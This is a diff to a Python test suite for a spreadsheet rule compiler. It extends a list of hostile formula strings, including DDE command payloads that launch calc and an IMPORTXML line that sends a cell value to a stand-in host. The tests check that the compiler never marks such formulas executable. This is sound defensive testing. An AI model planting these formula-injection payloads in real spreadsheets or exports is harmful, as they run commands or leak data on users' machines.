@@ -15,11 +15,17 @@ HOSTILE = [
     '=IMPORTXML(CONCAT("http://x/?",A1),"//a")',
     "\t=1+1",
     "\r=1+1",
+    '=name*12+HYPERLINK("x")',
+    "=salary*12&cmd|' /C calc'!A0",
+    "=IF(1,UPPER(name),cmd|' /C calc'!A0)",
+    "=salary*12+Sheet2!A1",
+    '=UPPER(name)&HYPERLINK("x")',
+    "=TRIM(x)+cmd|' /C calc'!A0",
 ]
 
 
-def _compile(rule_text: str, *, dest_named: bool) -> dict:
-    dest_cell = ",email" if dest_named else ","
+def _compile(rule_text: str, *, dest_named: bool, dest_col: str = "email") -> dict:
+    dest_cell = f",{dest_col}" if dest_named else ","
     csv = (
         "rule_id,column,destination_column,rule,severity\n"
         f'V001,email{dest_cell},"{rule_text.replace(chr(34), chr(34) * 2)}",ERROR\n'
@@ -27,8 +33,8 @@ def _compile(rule_text: str, *, dest_named: bool) -> dict:
     return compile_rule_workbook(
         "r.csv",
         csv,
-        source_columns=["email"],
-        dest_columns=["email"] if dest_named else [],
+        source_columns=["email", "salary", "first", "last", "name", "x", "A2"],
+        dest_columns=[dest_col] if dest_named else [],
     )
 
 
@@ -45,6 +51,8 @@ def test_formula_cell_is_never_executable(rule_text: str, dest_named: bool):
     assert rule.get("kind") != "lookup", rule
     assert not rule.get("enforced_at_execute"), rule
     assert not rule.get("contract"), rule
+    assert rule.get("transform") in (None, "none", ""), rule
+    assert not (report.get("shape_steps") or []), report
     assert any("not a supported closed form" in str(i) for i in rule.get("issues") or [])
 
 
@@ -54,6 +62,25 @@ def test_excel_closed_forms_stay_executable():
         rule = (report.get("rules") or [{}])[0]
         assert rule.get("status") == "executable", (text, rule)
         assert rule.get("kind") == kind, (text, rule)
+
+
+def test_derive_and_concat_positive_controls():
+    for text, kind in [
+        ("=salary*12", "derive"),
+        ("=A2*12", "derive"),
+        ('=CONCATENATE(first," ",last)', "concat"),
+    ]:
+        report = _compile(text, dest_named=True, dest_col="d_" + kind)
+        rule = (report.get("rules") or [{}])[0]
+        assert rule.get("kind") == kind, (text, rule)
+        assert rule.get("status") == "executable", (text, rule)
+
+
+def test_ampersand_concat_was_never_supported_and_stays_review():
+    """``&`` was not a concat form before this fix — it stays in review,
+    not quietly upgraded."""
+    rule = (_compile('=first&" "&last', dest_named=True).get("rules") or [{}])[0]
+    assert rule.get("status") == "needs_confirmation", rule
 
 
 def test_derive_formula_unchanged():
